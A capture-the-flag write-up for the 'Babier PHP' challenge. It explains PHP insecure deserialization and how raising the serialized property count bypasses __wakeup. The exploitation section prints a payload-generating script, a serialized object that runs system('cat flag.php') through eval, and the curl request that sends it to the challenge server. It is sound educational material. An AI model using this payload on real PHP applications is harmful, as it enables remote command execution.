# Babier PHP

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Solved by: @siunam
- 4 solves / 894 points
- Author: @ppcc
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆☆

## Background

Just some simpler PHP deserialization.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113173445.png)

## Enumeration

Same as the last part, Baby PHP. Highly recommend you to read the [last part's writeup]() if you haven't done so.

This time, other classes except `A` are different. Let's take a look at the modified class `B`:

```php
class B
{
    public $command;
    public $guess;
    public $random_number;
    public function __wakeup()
    {
        $this->command = "echo 'flag';";
    }

    public function __call($method, $args)
    {
        // You will get it eventually after the competition. 
        for ($i = 0; $i < 10000; $i++) {
            $this->guess = random_int(0, getrandmax());
            if ($this->guess !== $this->random_number) {
                // echo "Incorrect guess: " . $this->guess . "<br>"; // Also no more leaked random number
                return;
            }
        }
        eval($this->command);
    }
}
```

In magic method `__call`, although the for loop check is a little bit different, the **bypass method is exactly the same**.

However, magic method [`__wakeup`](https://www.php.net/manual/en/language.oop5.magic.php) is causing us some troubles. According to its documentation, it said:

> Conversely, [unserialize()](https://www.php.net/manual/en/function.unserialize.php) checks for the presence of a function with the magic name [\_\_wakeup()](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup). If present, this function can reconstruct any resources that the object may have.

So, when `unserialize` is called, it'll also execute magic method `__wakeup` and reconstruct the object instance. In our case, our **`command` property will get overwritten by the `__wakeup` magic method**.

If we Google "PHP `__wakeup` bypass", we should see [this blog post](https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/):

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113174347.png)

Turns out, if the serilized object string's property number is greater than the correct one, magic method `__wakeup` will not be invoked.

> Note: Feel free to read [this PoC](https://github.com/Xp4int3r/POC/blob/master/CVE-2016-7124.md) for more information.

## Exploitation

To bypass magic method `__wakeup`, we need to first get our normal serialized payload:

<details><summary><strong>payload.php</strong></summary>

```php
<?php
include_once "index.php";

$a = new A();
$a->class = new B();
$a->class->command = "system('cat flag.php');";
$a->class->guess = 1;
$a->class->random_number = &$a->class->guess;

$serialized = serialize($a);
echo $serialized;
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/HKUST-Firebird-CTF-Competition-2025/Web/Babier-PHP)-[2025.01.13|17:53:15(HKT)]
└> php payload.php 
O:1:"A":1:{s:5:"class";O:1:"B":3:{s:7:"command";s:23:"system('cat flag.php');";s:5:"guess";i:1;s:13:"random_number";R:4;}}
[...]
```

Then, we modify `"A":1`'s `1` to be greater than `1`:

```php
O:1:"A":1337:{s:5:"class";O:1:"B":3:{s:7:"command";s:23:"system('cat flag.php');";s:5:"guess";i:1;s:13:"random_number";R:4;}}
```

```shell
┌[siunam♥Mercury]-(~/ctf/HKUST-Firebird-CTF-Competition-2025/Web/Babier-PHP)-[2025.01.13|17:54:46(HKT)]
└> curl --get http://phoenix-chal.firebird.sh:36011/ --data-urlencode "payload=O:1:\"A\":2:{s:5:\"class\";O:1:\"B\":3:{s:7:\"command\";s:23:\"system('cat flag.php');\";s:5:\"guess\";i:1;s:13:\"random_number\";R:4;}}"
<?php
$flag = "firebird{This_is_an_intended_behavior..._Consider_reading_the_official_guideline}";
echo "flag{You_win_This_is_the_flag}";
?>
```

- **Flag: `firebird{This_is_an_intended_behavior..._Consider_reading_the_official_guideline}`**

## Conclusion

What we've learned:

1. PHP insecure deserialization & `__wakeup` magic method bypass